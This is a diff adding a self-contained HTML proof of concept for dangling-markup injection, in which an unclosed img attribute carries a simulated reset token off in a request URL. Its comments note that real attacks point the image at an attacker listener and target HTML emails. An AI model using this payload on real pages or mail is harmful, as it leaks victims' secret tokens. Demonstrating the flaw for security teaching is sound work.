@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<!--
+  Safe PoC -> x8bitranjit.
+  Benign PoC lab - x8bitranjit style. Authorized security testing only.
+
+  WHAT THIS DEMONSTRATES: Dangling-markup injection - an UNCLOSED attribute
+  swallows the rest of the page into one URL. No JavaScript needed; CSP does
+  not stop it (it is just an <img> load).
+
+  HOW THIS SELF-CONTAINED DEMO WORKS: the "secret" below simulates
+  victim-only content (a reset token). The unclosed <img src=" is the
+  attacker-controlled prefix. Open DevTools > Network: the browser requests
+  "poc_leak_target? - and EVERYTHING up to the next quote (the simulated
+  secret token) rides along in the request URL. On a real target the img
+  host is the attacker's listener (interactsh/Collaborator).
+
+  WHERE IT FIRES: stored/reflected attacker text rendered BEFORE
+  victim-only content on the same page; classic high-yield variant is the
+  HTML EMAIL (mail clients prefetch images -> the reset link leaks from
+  digest emails).
+-->
+<html>
+<head><title>Benign dangling-markup PoC</title></head>
+<body style="font-family:Arial">
+  <h2>Benign dangling-markup PoC</h2>
+  <p>Simulated victim-only content (in a real app: reset token, private page tail):</p>
+
+  <!-- attacker-controlled stored/reflected text starts here (unclosed attribute) -->
+  <img src="poc_leak_target?captured=
+  <hr>
+  <p>Your simulated secret token: <b>SECRET-TOKEN-123-XYZ</b></p>
+  <p>More victim-only content: account=demo, role=member, balance=100</p>
+  <!-- the img above has no closing quote: everything up to the NEXT quote
+       in the document (none until much later) becomes part of the URL -->
+
+  <p>Open DevTools > Network and look for the request to <code>poc_leak_target?...</code> -
+     the URL contains the "secret" content that followed the unclosed attribute.</p>
+  <img src="closer.png" alt="">
+</body>
+  <p style="font-size:12px;color:#666">Safe PoC -&gt; x8bitranjit</p>
+
+</html>
